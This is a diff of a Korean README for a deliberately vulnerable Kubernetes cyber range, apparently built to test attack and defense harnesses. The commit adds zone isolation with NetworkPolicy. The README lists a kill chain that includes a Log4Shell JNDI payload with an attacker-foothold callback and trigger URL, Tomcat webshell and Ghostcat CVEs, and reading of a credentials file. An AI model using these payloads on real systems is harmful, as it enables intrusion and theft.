@@ -11,28 +11,41 @@
 | 존 | 네임스페이스 | 구성 | 단계 |
 |----|--------------|------|------|
 | 외부 | `corp-ext` | 공격자 발판만 | — |
-| DMZ | `corp-dmz` | Tomcat, Solr(Log4j) | **3 (지금)** |
+| DMZ | `corp-dmz` | Tomcat, Solr(Log4j) | 3 ✓ |
 | 내부 | `corp-internal` | Samba, Redis, Jenkins | 2 ✓ |
 | 크라운 | `corp-crown` | PostgreSQL 11.2 민감 DB | 1 ✓ |
-| 방어 | `corp-defense` | IDS, Falco, 서비스 로그 | 4·5 |
-
-존 사이는 NetworkPolicy default-deny 후 한 방향만 개방해 킬체인을 강제한다(4단계에서 배선).
+| 방어 | `corp-defense` | IDS, Falco, 서비스 로그 | 4b·5 |
 
 ## 단계적 구현
 
 1. **크라운(PostgreSQL)** ✓ — 공격 → 채점 1바퀴 검증.
 2. **내부 존(Samba·Redis·Jenkins)** ✓ — 측면이동·자격증명 수집.
-3. **DMZ(Tomcat·Solr/Log4j) + Log4Shell 콜백** ← 이 커밋.
-4. 방어장비(WAF·IDS) + 존 격리(NetworkPolicy)
-5. 방어 2층 배선 (Falco·서비스 로그 → 방어 하네스 VM D)
+3. **DMZ(Tomcat·Solr/Log4j)** ✓ — 외부노출 웹.
+4. 방어장비·격리:
+   - **4a. 존 격리(NetworkPolicy default-deny)** ✓ ← 이 커밋.
+   - 4b. 방어장비(WAF ModSecurity · IDS Suricata) — 예정(VulHub에 없어 직접 이미지).
+5. 방어 2층 배선 (Falco·서비스 로그 → 방어 하네스 VM D).
 
 ## 킬체인 (발판 → 크라운)
 
-1. **발판**(`corp-ext`) → WAF(4단계) → **DMZ 원격코드실행** [통과 ①]
+1. **발판**(`corp-ext`) → WAF(4b) → **DMZ 원격코드실행** [통과 ①]
    - Tomcat: PUT 웹셸(CVE-2017-12615) 또는 Ghostcat AJP(CVE-2020-1938)
    - Solr: Log4Shell `${jndi:ldap://<발판>/x}`(CVE-2021-44228)
 2. DMZ → **내부 측면이동**: Samba·Redis·Jenkins 장악 + 자격증명 수집 [통과 ②]
 3. Jenkins의 `corp-db.properties` → **크라운** PostgreSQL 접속 → 민감 데이터 read [크라운]
+
+## 존 격리 (NetworkPolicy, 4a)
+
+`default-deny` ingress 후 **한 방향만** 개방 → 위 킬체인을 강제한다.
+
+| 존 | 들어올 수 있는 곳 |
+|----|------------------|
+| `corp-dmz` | `corp-ext` 에서만 |
+| `corp-internal` | `corp-dmz` 에서만 |
+| `corp-crown` | `corp-internal` 에서만 |
+
+역방향·존 건너뛰기는 차단. `egress`는 열어둬 DNS·조회는 된다. k3s 기본 CNI가 집행한다.
+WAF(4b) 추가 시 `allow-from-ext` 를 **WAF 파드로만** 좁혀 WAF를 유일 진입점으로 만든다.
 
 ## 서비스별 취약 요소
 
@@ -54,7 +67,6 @@
 그래서 환경엔 두지 않고, 인터넷 없는 섬에서는 공격 하네스가 `corp-ext` 발판에서
 marshalsec / Java-Chains LDAP+HTTP를 띄워 섬 내부로 콜백한다.
 트리거: `GET /solr/admin/cores?action=${jndi:ldap://<발판>:1389/x}`.
-발판·콜백 도구 배선은 공격 하네스 통합 단계의 몫이다.
 
 ## 측면이동 체인 (통과 ② → 크라운)
 
@@ -69,6 +81,7 @@ kubectl apply -f k8s/corp/00-namespaces.yaml
 kubectl apply -f k8s/corp/crown/
 kubectl apply -f k8s/corp/internal/
 kubectl apply -f k8s/corp/dmz/
+kubectl apply -f k8s/corp/70-networkpolicy.yaml
 
 kubectl -n corp-crown    rollout status deploy/postgres
 kubectl -n corp-internal rollout status deploy/samba
@@ -77,8 +90,10 @@ kubectl -n corp-internal rollout status deploy/jenkins
 kubectl -n corp-dmz      rollout status deploy/tomcat
 kubectl -n corp-dmz      rollout status deploy/solr
 
-# Tomcat PUT 업로드가 열렸는지(readonly=false 반영) 확인
-kubectl -n corp-dmz exec deploy/tomcat -- grep -c 'readonly' conf/web.xml
+# 존 격리 확인: crown 은 internal 에서만 (dmz 에서 직접 접근은 막혀야 정상)
+kubectl -n corp-internal exec deploy/jenkins -- sh -c 'nc -zv postgres.corp-crown 5432'   # 열림
+kubectl -n corp-dmz      exec deploy/tomcat  -- sh -c 'nc -zv postgres.corp-crown 5432'   # 막힘
+
 # 내부 → 크라운 체인 확인
 kubectl -n corp-internal exec deploy/jenkins -- cat /opt/deploy/corp-db.properties
 ```
